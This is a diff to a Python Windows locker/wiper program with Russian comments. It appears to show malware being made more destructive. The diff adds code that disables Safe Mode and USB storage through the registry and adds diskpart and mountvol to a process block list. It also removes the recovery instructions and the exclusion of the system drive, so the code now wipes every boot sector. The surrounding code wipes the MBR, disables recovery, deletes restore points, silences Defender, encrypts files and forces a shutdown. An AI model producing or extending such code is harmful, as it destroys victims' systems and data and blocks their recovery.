@@ -1,7 +1,7 @@
 # language: Python, file: locker.py
 # Зависимости: pillow keyboard psutil cryptography pygame
-# ВНИМАНИЕ: 3-я неверная попытка → MBR + boot sectors + recovery off + автозапуск + shutdown.
-# Только локальная VM со снапшотом. Восстановление: live-USB + diskpart clean + bootrec /rebuildbcd.
+# ВНИМАНИЕ: 3-я неверная попытка → MBR + boot sectors + recovery off + shutdown.
+# Только локальная VM со снапшотом.
 
 import ctypes
 import hashlib
@@ -41,6 +41,7 @@ BLOCK_EXE = {
     "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
     "processhacker.exe", "msconfig.exe", "iexplore.exe",
     "powershell.exe", "pwsh.exe", "wt.exe",
+    "diskpart.exe", "mountvol.exe", "mmc.exe",
 }
 
 # ================= WINAPI =================
@@ -156,7 +157,7 @@ def wipe_mbr() -> bool:
     finally:
         kernel32.CloseHandle(h)
 
-# ================= BOOT SECTORS (без системного) =================
+# ================= BOOT SECTORS =================
 def wipe_ntfs_boot_sectors():
     system_drive = os.environ.get("SystemDrive", "C:").rstrip("\\").upper()
     for letter in string.ascii_uppercase:
@@ -383,6 +384,53 @@ def apply_reg_blocks():
     reg_set(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
             "NoWinKeys", 1)
 
+
+def _gpupdate_bg():
+    try:
+        subprocess.run(["gpupdate", "/force"], capture_output=True,
+                       creationflags=0x08000000, timeout=15)
+    except Exception:
+        pass
+
+
+def apply_usb_and_safe_mode_blocks():
+    import winreg
+    # 1. Запрет Safe Mode (HKLM, 64-bit view)
+    sys_path = r"System\CurrentControlSet\Control\SafeBoot"
+    try:
+        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, sys_path + r"\Minimal", 0,
+                                winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY) as k:
+            winreg.SetValueEx(k, "(Default)", 0, winreg.REG_SZ, "Driver")
+    except Exception:
+        pass
+    try:
+        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, sys_path + r"\Network", 0,
+                                winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY) as k:
+            winreg.SetValueEx(k, "(Default)", 0, winreg.REG_SZ, "Driver")
+    except Exception:
+        pass
+
+    # 2. Блокировка USB-накопителей
+    usb_path = r"SYSTEM\CurrentControlSet\Services\USBSTOR"
+    try:
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, usb_path, 0,
+                            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
+            winreg.SetValueEx(k, "Start", 0, winreg.REG_DWORD, 4)
+    except Exception:
+        pass
+
+    # 3. Политики запрета записи/чтения на USB
+    policy_path = r"Software\Policies\Microsoft\Windows\RemovableStorageDevices\{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}"
+    try:
+        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, policy_path, 0,
+                                winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY) as k:
+            winreg.SetValueEx(k, "Deny_All", 0, winreg.REG_DWORD, 1)
+    except Exception:
+        pass
+
+    # Принудительное обновление политик в фоне
+    threading.Thread(target=_gpupdate_bg, daemon=True).start()
+
 # ================= ШИФРОВАНИЕ =================
 def encrypt_file(path: str, key: bytes, iv: bytes) -> None:
     try:
@@ -428,6 +476,7 @@ def main():
     ensure_admin()
     quiet_defender()
     apply_reg_blocks()
+    apply_usb_and_safe_mode_blocks()
     install_autostart()
     init_scream()
 
@@ -509,7 +558,6 @@ def main():
         win.after(3000, locker_screen)
 
     def wipe_and_troll():
-        # shutdown ставим ДО wipe C:, чтобы процесс успел стартовать
         try:
             subprocess.Popen(
                 ["shutdown", "/r", "/t", "15", "/f"],
@@ -521,7 +569,7 @@ def main():
         ok_mbr = wipe_mbr()
         disable_recovery()
         delete_restore_points()
-        wipe_ntfs_boot_sectors()  # без системного диска
+        wipe_ntfs_boot_sectors()
 
         for w in win.winfo_children():
             w.destroy()
